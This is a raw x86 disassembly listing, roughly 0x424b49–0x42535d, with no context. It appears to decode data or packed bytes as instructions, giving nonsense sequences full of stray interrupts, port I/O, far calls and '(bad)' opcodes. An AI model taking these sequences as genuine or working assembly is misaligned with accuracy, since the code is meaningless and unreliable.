  424b49:	or     dh,BYTE PTR [esi+0x2d]
  424b4c:	or     dh,BYTE PTR [esi+0x35]
  424b4f:	leave  
  424b50:	push   es
  424b51:	jo     0x424b53
  424b53:	add    BYTE PTR [eax],al
  424b55:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b5b:	pushf  
  424b5c:	add    BYTE PTR [eax],al
  424b5e:	add    BYTE PTR [edx],cl
  424b60:	pop    ss
  424b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b62:	add    BYTE PTR [eax],al
  424b64:	add    cl,cl
  424b66:	push   es
  424b67:	lods   al,BYTE PTR ds:[esi]
  424b68:	add    BYTE PTR [eax],al
  424b6a:	add    BYTE PTR [edx-0x61],cl
  424b6d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b73:	add    BYTE PTR [eax],al
  424b75:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b7b:	les    eax,FWORD PTR [eax]
  424b7d:	add    BYTE PTR [eax],al
  424b7f:	popa   
  424b80:	lahf   
  424b81:	xchg   BYTE PTR ds:0x9006c9,dh
  424b87:	add    BYTE PTR [eax],al
  424b89:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b8f:	aam    0x0
  424b91:	add    BYTE PTR [eax],al
  424b93:	call   0xa77d237
  424b98:	iret   
  424b99:	fadd   QWORD PTR [eax]
  424b9b:	add    BYTE PTR [eax],al
  424b9d:	leave  
  424b9e:	push   es
  424b9f:	in     al,0x0
  424ba1:	add    BYTE PTR [eax],al
  424ba3:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424ba9:	add    ecx,ecx
  424bab:	jbe    0x424bb2
  424bad:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424bb3:	or     ecx,ecx
  424bb5:	jbe    0x424b83
  424bb7:	inc    ecx
  424bb8:	lahf   
  424bb9:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424bbf:	jbe    0x424be6
  424bc1:	pusha  
  424bc2:	lahf   
  424bc3:	xchg   BYTE PTR ds:0x493d76c9,dh
  424bc9:	and    DWORD PTR [esi-0x3292c4cb],eax
  424bcf:	int3   
  424bd0:	push   es
  424bd1:	jo     0x424bd3
  424bd3:	add    BYTE PTR [eax],al
  424bd5:	shr    ebx,cl
  424bd7:	xchg   edx,eax
  424bd8:	add    DWORD PTR [edx],eax
  424bda:	scas   eax,DWORD PTR es:[edi]
  424bdb:	or     esp,ecx
  424bdd:	test   DWORD PTR [eax+eax*1+0x0],eax
  424be1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424be5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424beb:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424bf5:	add    BYTE PTR [eax-0x7c],dh
  424bf8:	int    0xb3
  424bfa:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424c00:	inc    esp
  424c01:	add    BYTE PTR [eax],al
  424c03:	add    BYTE PTR [edx+0x70],ah
  424c06:	add    BYTE PTR [ecx-0x78],dh
  424c09:	or     dh,BYTE PTR [esi+0x7d]
  424c0c:	iret   
  424c0d:	jbe    0x424bcc
  424c0f:	jo     0x424bde
  424c11:	or     BYTE PTR ds:0x808081,ah
  424c17:	push   eax
  424c18:	int    0x76
  424c1a:	jge    0x424c1c
  424c1c:	icebp  
  424c1d:	int    0x76
  424c1f:	std    
  424c20:	int    0x8d
  424c22:	std    
  424c23:	cmp    edi,DWORD PTR [ecx+0x4]
  424c26:	add    bh,bh
  424c28:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c2e:	push   ebx
  424c2f:	ror    DWORD PTR [edx],cl
  424c31:	jbe    0x424c40
  424c33:	int    0x8d
  424c35:	std    
  424c36:	int    0x76
  424c38:	std    
  424c39:	cmp    ecx,DWORD PTR [edi]
  424c3b:	add    al,0x11
  424c3d:	call   ebx
  424c3f:	lods   eax,DWORD PTR ds:[esi]
  424c40:	sub    bl,dl
  424c42:	jmp    0x424bd6
  424c44:	push   ebx
  424c45:	jge    0x424c14
  424c47:	jbe    0x424c06
  424c49:	inc    ebx
  424c4a:	rcl    esp,cl
  424c4c:	xchg   esi,eax
  424c4d:	or     dh,BYTE PTR [esi+0x75]
  424c50:	in     al,dx
  424c51:	das    
  424c52:	int    0x80
  424c54:	int    0x8d
  424c56:	jne    0x424c62
  424c58:	jbe    0x424c17
  424c5a:	int    0x76
  424c5c:	mov    ebp,0x4dd4d343
  424c61:	int    0x70
  424c63:	sbb    al,0xcd
  424c65:	mov    bl,0x25
  424c67:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c71:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c7b:	int    0xb3
  424c7d:	sub    eax,0xcd808081
  424c82:	xchg   esi,eax
  424c83:	dec    esp
  424c84:	int    0x62
  424c86:	cmp    al,0x87
  424c88:	xor    DWORD PTR [edx],ecx
  424c8a:	jo     0x424cb0
  424c8c:	int    0x76
  424c8e:	stc    
  424c8f:	int    0x8d
  424c91:	stc    
  424c92:	cmp    edi,DWORD PTR [ecx+0x4]
  424c95:	add    bh,bh
  424c97:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c9d:	push   ebx
  424c9e:	ror    DWORD PTR [edx],cl
  424ca0:	jbe    0x424caf
  424ca2:	int    0x96
  424ca4:	and    al,0x9a
  424ca6:	pop    ebx
  424ca7:	mov    ebp,0xf5e2
  424cac:	push   es
  424cad:	ins    DWORD PTR es:[edi],dx
  424cae:	das    
  424caf:	add    eax,0x80808099
  424cb4:	add    dh,dl
  424cb6:	and    al,0xcd
  424cb8:	lock pop ebx
  424cba:	mov    ebp,0xf52c
  424cbf:	push   es
  424cc0:	ins    DWORD PTR es:[edi],dx
  424cc1:	das    
  424cc2:	add    eax,0x808080c5
  424cc7:	int    0x76
  424cc9:	and    al,0xcd
  424ccb:	lock int 0xd5
  424cce:	mov    ebp,0xfbe7
  424cd3:	push   es
  424cd4:	ins    DWORD PTR es:[edi],dx
  424cd5:	das    
  424cd6:	add    eax,0x808080d1
  424cdb:	call   0x0:0xf90ebd5b
  424ce2:	push   es
  424ce3:	ins    DWORD PTR es:[edi],dx
  424ce4:	das    
  424ce5:	add    eax,0x8080802d
  424cea:	int    0x8
  424cec:	and    eax,0x43808081
  424cf1:	sbb    al,0xd6
  424cf3:	sbb    cl,ch
  424cf5:	or     BYTE PTR [ecx],dl
  424cf7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424d01:	int    0x8d
  424d03:	dec    esp
  424d04:	add    BYTE PTR [ecx+0x70005b94],dl
  424d0a:	and    al,0xcd
  424d0c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424d12:	or     ch,0x7d
  424d15:	cmp    ecx,DWORD PTR [edi]
  424d17:	add    al,0x11
  424d19:	call   ebx
  424d1b:	jmp    0x424caf
  424d1d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424d23:	(bad)
  424d27:	dec    ecx
  424d28:	and    BYTE PTR [esi-0x778932cb],al
  424d2e:	int    0x8d
  424d30:	mov    ch,cl
  424d32:	jbe    0x424d58
  424d34:	shr    ebx,cl
  424d36:	xchg   edx,eax
  424d37:	adc    al,BYTE PTR [edx]
  424d39:	scas   eax,DWORD PTR es:[edi]
  424d3a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d40:	sbb    ch,cl
  424d42:	ins    BYTE PTR es:[edi],dx
  424d43:	cmp    al,0xcd
  424d45:	lea    ebp,[edi+eax*4]
  424d48:	lds    ecx,FWORD PTR [edx]
  424d4a:	outs   dx,BYTE PTR ds:[esi]
  424d4b:	adc    al,0xcd
  424d4d:	jbe    0x424d7b
  424d4f:	leave  
  424d50:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d57:	sub    al,0xa
  424d59:	pushf  
  424d5a:	test   ch,cl
  424d5c:	jbe    0x424d8e
  424d5e:	int    0x8d
  424d60:	sub    al,0xa
  424d62:	outs   dx,BYTE PTR ds:[esi]
  424d63:	mov    ch,cl
  424d65:	jbe    0x424d7b
  424d67:	int    0x8d
  424d69:	sub    al,0xa
  424d6b:	outs   dx,BYTE PTR ds:[esi]
  424d6c:	dec    esp
  424d6d:	in     al,dx
  424d6e:	adc    al,0xcd
  424d70:	jbe    0x424d96
  424d72:	int    0x6c
  424d74:	cmp    al,0xcd
  424d76:	lea    ebp,[edi+eax*4]
  424d79:	lds    ecx,FWORD PTR [edx]
  424d7b:	outs   dx,BYTE PTR ds:[esi]
  424d7c:	adc    al,0xcd
  424d7e:	jbe    0x424dac
  424d80:	add    al,0x2c
  424d82:	or     cl,0x76
  424d85:	icebp  
  424d86:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d90:	cmp    ebx,ebp
  424d92:	int    0xc5
  424d94:	arpl   sp,bp
  424d96:	xchg   edx,eax
  424d97:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d9a:	test   al,0xcb
  424d9c:	shl    BYTE PTR [eax+eax*4],cl
  424d9f:	xchg   esi,eax
  424da0:	int    0xed
  424da2:	jno    0x424e15
  424da4:	das    
  424da5:	mov    ebx,0x74cf146e
  424daa:	mov    BYTE PTR [edi+ebp*1],bl
  424dad:	mov    ebx,0x9a5b867e
  424db2:	leave  
  424db3:	jbe    0x424db2
  424db5:	dec    ecx
  424db6:	and    DWORD PTR [esi-0x672f5cb],eax
  424dbc:	push   es
  424dbd:	retf   
  424dbe:	aam    0xb4
  424dc0:	popa   
  424dc1:	shl    DWORD PTR [ecx],1
  424dc3:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424dc9:	out    0x88,al
  424dcb:	xchg   edx,edi
  424dcd:	pop    esi
  424dce:	out    0x4c,al
  424dd0:	or     BYTE PTR [ebp-0x33],0xdc
  424dd4:	mov    BYTE PTR [edi-0x77197806],al
  424dda:	pop    esi
  424ddb:	out    0x4c,al
  424ddd:	cmp    BYTE PTR [edx-0x33],0x8d
  424de1:	std    
  424de2:	int    0xe6
  424de4:	std    
  424de5:	cmp    edx,DWORD PTR [ebx]
  424de7:	add    al,0xf8
  424de9:	call   ebx
  424deb:	jmp    0xd41e1b18
  424df0:	in     al,dx
  424df1:	xchg   edx,eax
  424df2:	push   ebx
  424df3:	cld    
  424df4:	add    al,0xf2
  424df6:	std    
  424df7:	add    al,0xd3
  424df9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424e00:	sub    BYTE PTR [ebx-0x6],dl
  424e03:	adc    bh,al
  424e05:	dec    ecx
  424e06:	and    DWORD PTR [esi-0x2197ecb],eax
  424e0c:	int    0x8d
  424e0e:	std    
  424e0f:	int    0xe6
  424e11:	std    
  424e12:	cmp    edx,DWORD PTR [ebx]
  424e14:	add    al,0xf8
  424e16:	call   ebx
  424e18:	jmp    0x424dac
  424e1a:	shr    ecx,cl
  424e1c:	sub    BYTE PTR [ebx-0x10],dl
  424e1f:	inc    ebx
  424e20:	(bad)  
  424e21:	stc    
  424e22:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424e29:	ror    BYTE PTR [eax-0x12326980],cl
  424e2f:	add    al,0xed
  424e31:	push   eax
  424e32:	leave  
  424e33:	jbe    0x424dda
  424e35:	mov    edx,0xc98080ac
  424e3a:	jbe    0x424df1
  424e3c:	xchg   eax,ecx
  424e3e:	add    BYTE PTR [eax-0x68528937],0x40
  424e45:	add    BYTE PTR [eax-0x51068937],0x30
  424e4c:	test   BYTE PTR [eax-0x4a028937],al
  424e52:	lods   al,BYTE PTR ds:[esi]
  424e53:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e5a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e61:	add    BYTE PTR [eax-0x78628937],0x80
  424e68:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e6f:	add    BYTE PTR [eax-0x32128937],0x71
  424e76:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e7d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e84:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e8a:	(bad)  
  424e8b:	stc    
  424e8c:	cmp    ebx,edx
  424e8e:	clc    
  424e8f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e95:	repnz popa 
  424e97:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e9d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424ea4:	add    BYTE PTR [eax+0x3cded312],0x80
  424eab:	or     cl,0x76
  424eae:	cmc    
  424eaf:	icebp  
  424eb0:	lea    eax,[eax-0x2893680]
  424eb6:	jnp    0x424e8c
  424eb8:	add    BYTE PTR [eax+0x18f976c9],0x30
  424ebf:	add    BYTE PTR [eax-0x32068933],0x96
  424ec6:	std    
  424ec7:	ss dec eax
  424ec9:	pushf  
  424eca:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ed1:	int    0xe3
  424ed3:	push   esi
  424ed4:	jp     0x424ed5
  424ed6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424edd:	int    0x76
  424edf:	std    
  424ee0:	xchg   DWORD PTR [esi-0x78],esi
  424ee3:	int    0x96
  424ee5:	std    
  424ee6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424eec:	xor    ch,cl
  424eee:	jbe    0x424f01
  424ef0:	int    0x96
  424ef2:	in     eax,dx
  424ef3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424ef7:	cmp    BYTE PTR [ebx],0xd2
  424efa:	int    0x96
  424efc:	mov    ebp,0xe261d253
  424f01:	fadd   DWORD PTR [eax-0x320ecc80]
  424f07:	jbe    0x424ebe
  424f09:	xchg   DWORD PTR [ebx],edx
  424f0b:	popa   
  424f0c:	fist   WORD PTR [eax+eax*4-0x80]
  424f10:	xor    esi,ecx
  424f12:	xchg   DWORD PTR [esi-0x5a893253],edx
  424f18:	int    0xd6
  424f1a:	xor    ch,cl
  424f1c:	out    0x9d,al
  424f1e:	adc    bh,bl
  424f20:	mov    DWORD PTR [ecx-0x80],esi
  424f23:	sub    BYTE PTR [ebx],0xf1
  424f26:	int    0x76
  424f28:	xchg   ebp,eax
  424f29:	adc    bh,bl
  424f2b:	mov    dh,0x2c
  424f2d:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f34:	clc    
  424f35:	int    0x96
  424f37:	icebp  
  424f38:	push   esi
  424f39:	out    0x1e,al
  424f3b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f42:	icebp  
  424f43:	adc    dh,bl
  424f45:	pop    es
  424f46:	push   edx
  424f47:	add    BYTE PTR [eax+0x72f9943],0x63
  424f4e:	add    BYTE PTR [eax],al
  424f50:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f56:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f5d:	pop    ebx
  424f5e:	cwde   
  424f5f:	call   0x8043:0xd9ed76c9
  424f66:	or     cl,0x76
  424f69:	adc    DWORD PTR [edx+0x7e],esi
  424f6c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f73:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f7a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f81:	add    BYTE PTR [eax-0x275a8937],0x58
  424f88:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f8f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f96:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f9d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424fa4:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424fab:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424fb2:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424fb9:	add    BYTE PTR [eax-0x44f28937],0x4d
  424fc0:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424fc7:	add    BYTE PTR [eax-0x32528933],0x8d
  424fce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fcf:	dec    ebp
  424fd0:	bound  ebp,QWORD PTR [ebx]
  424fd2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424fd9:	dec    ebp
  424fda:	pop    ds
  424fdb:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424fe1:	pop    edi
  424fe2:	xchg   ecx,eax
  424fe3:	mov    bh,0x7e
  424fe5:	stc    
  424fe6:	xor    edi,DWORD PTR [ebp-0x33]
  424fe9:	jbe    0x424fe8
  424feb:	int    0x96
  424fed:	stc    
  424fee:	sub    edx,edx
  424ff0:	int    0x96
  424ff2:	cmc    
  424ff3:	dec    ebp
  424ff4:	inc    edi
  424ff5:	outs   dx,DWORD PTR ds:[esi]
  424ff6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424ffd:	xor    edx,edx
  424fff:	int    0x96
  425001:	in     eax,dx
  425002:	push   ebx
  425003:	sar    BYTE PTR [ebx],cl
  425005:	fisubr DWORD PTR [ecx-0x27]
  425008:	ret    
  425009:	add    BYTE PTR [eax],al
  42500b:	clc    
  42500c:	test   ebp,0x72c34c96
  425012:	push   ds
  425013:	add    BYTE PTR [eax+0x76cdf133],0xbd
  42501a:	int    0xd6
  42501c:	mov    ch,0x33
  42501e:	leave  
  42501f:	das    
  425020:	sar    DWORD PTR [ecx+0x69],1
  425023:	fisttp DWORD PTR [edx]
  425025:	xchg   ecx,eax
  425026:	mov    ebx,ebp
  425028:	popa   
  425029:	add    BYTE PTR [eax-0x6a893680],0x9b
  425030:	push   esp
  425031:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  425038:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  42503f:	add    BYTE PTR [eax-0x7e5a8937],0x80
  425046:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  42504d:	pop    ebp
  42504e:	call   0xcdf4:0xf880806f
  425055:	xchg   esi,eax
  425056:	lods   eax,DWORD PTR ds:[esi]
  425057:	int    0xa6
  425059:	mov    BYTE PTR [ebx-0x2e],dl
  42505c:	int    0x96
  42505e:	popf   
  42505f:	xor    edx,edx
  425061:	int    0x96
  425063:	xchg   ebp,eax
  425064:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425066:	push   eax
  425067:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42506e:	mov    BYTE PTR [eax+0x2c],bl
  425071:	ret    0xafd
  425074:	jbe    0x42500b
  425076:	int    0x76
  425078:	icebp  
  425079:	int    0x96
  42507b:	or     eax,0xf3f7f534
  425080:	int    0x96
  425082:	xchg   ebp,eax
  425083:	xor    al,0x23
  425085:	inc    esp
  425086:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42508a:	inc    esi
  42508b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425092:	rol    esi,0x80
  425095:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42509c:	cmp    ebx,edx
  42509e:	clc    
  42509f:	hlt    
  4250a0:	int    0x96
  4250a2:	gs mov edi,0xc3d9
  4250a8:	ss aaa 
  4250aa:	push   esi
  4250ab:	add    BYTE PTR [eax+0xc56d233],0x6d
  4250b2:	add    BYTE PTR [eax],al
  4250b4:	xchg   DWORD PTR [ebp-0x33],edi
  4250b7:	jbe    0x4250b6
  4250b9:	int    0x96
  4250bb:	stc    
  4250bc:	sub    edx,edx
  4250be:	int    0x96
  4250c0:	cmc    
  4250c1:	dec    ebp
  4250c2:	inc    edi
  4250c3:	outs   dx,DWORD PTR ds:[esi]
  4250c4:	add    BYTE PTR [eax-0x69322dcd],0x11
  4250cb:	xor    edx,edx
  4250cd:	int    0x96
  4250cf:	in     eax,dx
  4250d0:	push   ebx
  4250d1:	sar    BYTE PTR [ebx],cl
  4250d3:	(bad)  
  4250d5:	hlt    
  4250d6:	int    0x96
  4250d8:	dec    esp
  4250d9:	xor    esi,ecx
  4250db:	int    0x76
  4250dd:	mov    ebp,0x33b5a6cd
  4250e2:	leave  
  4250e3:	das    
  4250e4:	rol    ebp,1
  4250e6:	int    0xdb
  4250e8:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  4250ee:	das    
  4250ef:	pop    es
  4250f0:	pop    esp
  4250f1:	add    BYTE PTR [eax],al
  4250f3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250f9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250ff:	in     eax,dx
  425100:	jo     0x4250cb
  425102:	jbe    0x4250d4
  425104:	xchg   ecx,eax
  425105:	aaa    
  425106:	ficom  WORD PTR [ebx]
  425108:	pop    ebp
  425109:	mov    ebp,0xa25230a
  42510e:	jbe    0x425165
  425110:	leave  
  425111:	jbe    0x425170
  425113:	mov    esi,0xa13de37
  425118:	jbe    0x42517f
  42511a:	leave  
  42511b:	jbe    0x42518a
  42511d:	fidiv  WORD PTR [edi]
  42511f:	ficom  WORD PTR [ebx]
  425121:	or     dh,BYTE PTR [esi+0x75]
  425124:	pop    ebx
  425125:	leave  
  425126:	jbe    0x4251a5
  425128:	scas   al,BYTE PTR es:[edi]
  425129:	aaa    
  42512a:	ficom  WORD PTR [ebx]
  42512c:	or     dh,BYTE PTR [esi+0xd]
  42512f:	cwde   
  425130:	call   0xde37:0x96f176c9
  425137:	adc    ecx,DWORD PTR [edx]
  425139:	jbe    0x4250d0
  42513b:	cmp    ebx,edx
  42513d:	cmp    eax,DWORD PTR [eax]
  42513f:	pop    edi
  425140:	dec    ecx
  425141:	and    DWORD PTR [esi-0x628936cb],eax
  425147:	out    0x37,al
  425149:	ficom  WORD PTR [ebx]
  42514b:	jp     0x425157
  42514d:	jbe    0x4250f4
  42514f:	int    0xd3
  425151:	or     dl,BYTE PTR [esi-0x4a19f513]
  425157:	iret   
  425158:	xchg   ecx,eax
  425159:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425160:	push   ebx
  425161:	ror    bh,cl
  425163:	je     0x42512c
  425165:	ror    ch,1
  425167:	xor    ch,cl
  425169:	pushf  
  42516a:	test   BYTE PTR [edi],ch
  42516c:	inc    ebp
  42516d:	loop   0x425101
  42516f:	shr    esp,cl
  425171:	xchg   edx,eax
  425172:	int    0x1c
  425174:	int    0x6c
  425176:	test   BYTE PTR [ebx],bh
  425178:	ins    DWORD PTR es:[edi],dx
  425179:	adc    bh,bl
  42517b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42517c:	mov    esi,0xf1534229
  425181:	or     dl,BYTE PTR [esi-0x6893207]
  425187:	xchg   DWORD PTR [ebp-0x2d],ebp
  42518a:	in     eax,0x28
  42518c:	inc    ebx
  42518d:	jbe    0x4251db
  42518f:	das    
  425190:	or     BYTE PTR [edi-0x327f7f80],bh
  425196:	jbe    0x425191
  425198:	add    al,0xb6
  42519a:	mov    ebp,0x11e60a80
  42519f:	int    0x76
  4251a1:	stc    
  4251a2:	push   es
  4251a3:	ins    DWORD PTR es:[edi],dx
  4251a4:	aam    0xb6
  4251a6:	cmp    ebp,DWORD PTR [ebp+0xa]
  4251a9:	out    0xf5,al
  4251ab:	int    0x96
  4251ad:	mov    ebp,0xcf88a6cd
  4251b2:	fs xor ch,cl
  4251b5:	xchg   esi,eax
  4251b6:	mov    BYTE PTR [edi-0x5269f527],al
  4251bc:	retf   0x922
  4251bf:	xchg   esi,eax
  4251c0:	add    ch,cl
  4251c2:	xchg   esi,eax
  4251c3:	stc    
  4251c4:	xchg   ecx,ebx
  4251c6:	retf   0x2014
  4251c9:	int    0xa6
  4251cb:	lods   eax,DWORD PTR ds:[esi]
  4251cc:	or     DWORD PTR [ebx],ebx
  4251ce:	retf   0x96
  4251d1:	int    0xa6
  4251d3:	stc    
  4251d4:	xchg   ecx,esp
  4251d6:	int    0xe6
  4251d8:	mov    BYTE PTR [ecx],cl
  4251da:	adc    al,0x43
  4251dc:	int    0x96
  4251de:	cmc    
  4251df:	ins    BYTE PTR es:[edi],dx
  4251e0:	add    al,0xea
  4251e2:	std    
  4251e3:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  4251e9:	push   ebx
  4251ea:	sar    BYTE PTR [ebx],cl
  4251ec:	ror    DWORD PTR [edx],cl
  4251ee:	jbe    0x4251e5
  4251f0:	push   ecx
  4251f1:	(bad)  
  4251f2:	cmc    
  4251f3:	int    0x96
  4251f5:	cmc    
  4251f6:	add    al,0x11
  4251f8:	call   ebx
  4251fa:	repz xchg edx,eax
  4251fc:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425202:	xchg   esi,eax
  425203:	stc    
  425204:	inc    ebx
  425205:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42520b:	int    0x76
  42520d:	adc    ebp,ecx
  42520f:	xchg   esi,eax
  425210:	stc    
  425211:	int    0xa6
  425213:	mov    ebp,0xcffdad04
  425218:	test   cl,dh
  42521a:	int    0x96
  42521c:	stc    
  42521d:	iret   
  42521e:	adc    al,0x5b
  425220:	int    0xa6
  425222:	dec    esp
  425223:	shl    ebx,cl
  425225:	sub    BYTE PTR [ebx-0x2e],dl
  425228:	cmp    edx,ebx
  42522a:	or     dh,BYTE PTR [esi+0x11]
  42522d:	push   ecx
  42522e:	(bad)  
  42522f:	adc    ebp,ecx
  425231:	xchg   esi,eax
  425232:	adc    DWORD PTR [ecx+edx*1],eax
  425235:	call   ebx
  425237:	repz xchg edx,eax
  425239:	shr    DWORD PTR [ebp-0x322dacd8],cl
  42523f:	xchg   esi,eax
  425240:	stc    
  425241:	xchg   edx,ebx
  425243:	xor    esp,edx
  425245:	or     dh,BYTE PTR [esi-0x43]
  425248:	inc    ebx
  425249:	lds    ebp,FWORD PTR [edi]
  42524b:	pop    es
  42524c:	outs   dx,DWORD PTR ds:[esi]
  42524d:	add    BYTE PTR [eax],al
  42524f:	add    ch,cl
  425251:	jbe    0x425240
  425253:	int    0x96
  425255:	mov    ch,0x4
  425257:	jmp    0xd384:0xd2046cfd
  42525e:	mov    ebp,0x3bd25328
  425263:	ror    ebp,cl
  425265:	popf   
  425266:	int    0xf1
  425268:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42526e:	in     eax,0x28
  425270:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425276:	or     ah,BYTE PTR [esi-0x12697613]
  42527c:	add    al,0xe6
  42527e:	in     eax,dx
  42527f:	xchg   BYTE PTR [edi],ch
  425281:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425287:	test   al,0x63
  425289:	retf   
  42528a:	ror    BYTE PTR [eax-0x12326980],cl
  425290:	add    al,0xed
  425292:	adc    al,0xcd
  425294:	jbe    0x42521e
  425296:	leave  
  425297:	jbe    0x4252aa
  425299:	dec    ecx
  42529a:	and    DWORD PTR [esi-0x28936cb],eax
  4252a0:	inc    ecx
  4252a1:	and    DWORD PTR [esi+0x5b80cd35],eax
  4252a7:	cwde   
  4252a8:	or     dh,BYTE PTR [esi-0x7]
  4252ab:	leave  
  4252ac:	jbe    0x4252a3
  4252ae:	into   
  4252af:	and    DWORD PTR [esi+0x76c99a35],eax
  4252b5:	in     eax,dx
  4252b6:	inc    esi
  4252b7:	sbb    DWORD PTR [ebp-0x22932de],esi
  4252bd:	int    0x8d
  4252bf:	std    
  4252c0:	sar    bh,0x5d
  4252c3:	shl    DWORD PTR [ecx],1
  4252c5:	xchg   BYTE PTR ds:0xd3f03baa,dh
  4252cb:	repnz sub BYTE PTR [ebx],bh
  4252ce:	adc    ebx,edx
  4252d0:	out    dx,eax
  4252d1:	xchg   edx,eax
  4252d2:	push   ebx
  4252d3:	add    cl,ch
  4252d5:	lea    edx,[ecx]
  4252d7:	int    0x96
  4252d9:	adc    DWORD PTR [ebx],edi
  4252db:	jge    0x425318
  4252dd:	(bad)  
  4252df:	jmp    0x425273
  4252e1:	shr    edx,cl
  4252e3:	sub    BYTE PTR [ebx+0x13],dl
  4252e6:	das    
  4252e7:	rol    DWORD PTR [edx],1
  4252e9:	jmp    0x42528a
  4252eb:	add    BYTE PTR [eax-0x6723280],0xcd
  4252f2:	xchg   esi,eax
  4252f3:	stc    
  4252f4:	cmp    ebx,ecx
  4252f6:	shr    edx,cl
  4252f8:	sub    BYTE PTR [ebx],bh
  4252fa:	jge    0x4252cf
  4252fc:	jmp    0x425290
  4252fe:	push   ebx
  4252ff:	adc    ecx,ebp
  425301:	xchg   esi,eax
  425302:	std    
  425303:	int    0xa6
  425305:	std    
  425306:	cmp    esi,ecx
  425308:	cmp    esp,ecx
  42530a:	shl    ebx,cl
  42530c:	xchg   edx,eax
  42530d:	shl    ebp,cl
  42530f:	sub    BYTE PTR [ebx-0x2b],dl
  425312:	push   es
  425313:	adc    ecx,ebp
  425315:	xchg   esi,eax
  425316:	stc    
  425317:	int    0x8d
  425319:	stc    
  42531a:	aam    0x58
  42531c:	cmp    esi,eax
  42531e:	shl    edx,cl
  425320:	sub    BYTE PTR [ebx],bh
  425322:	icebp  
  425323:	shl    ebx,cl
  425325:	xchg   edx,eax
  425326:	push   ebx
  425327:	jecxz  0x4252f6
  425329:	(bad)  
  42532a:	std    
  42532b:	int    0xa6
  42532d:	std    
  42532e:	cmp    edi,DWORD PTR [ebp+0x3b]
  425331:	loope  0x425306
  425333:	jmp    0x4252c7
  425335:	shl    ebp,cl
  425337:	sub    BYTE PTR [ebx+0xc],dl
  42533a:	aad    0xf3
  42533c:	int    0x8d
  42533e:	in     eax,dx
  42533f:	int    0xa6
  425341:	in     eax,dx
  425342:	cmp    edi,DWORD PTR [ebp+0x3b]
  425345:	loope  0x42531a
  425347:	jmp    0x4252db
  425349:	shl    ebp,cl
  42534b:	sub    BYTE PTR [ebx+0xc],dl
  42534e:	cmp    esp,ebx
  425350:	in     al,dx
  425351:	sub    al,0x3b
  425353:	lock shl edx,cl
  425356:	sub    BYTE PTR [ebx],bh
  425358:	icebp  
  425359:	shl    ebx,cl
  42535b:	xchg   edx,eax
  42535c:	push   ebx
  42535d:	jecxz  0x42532c
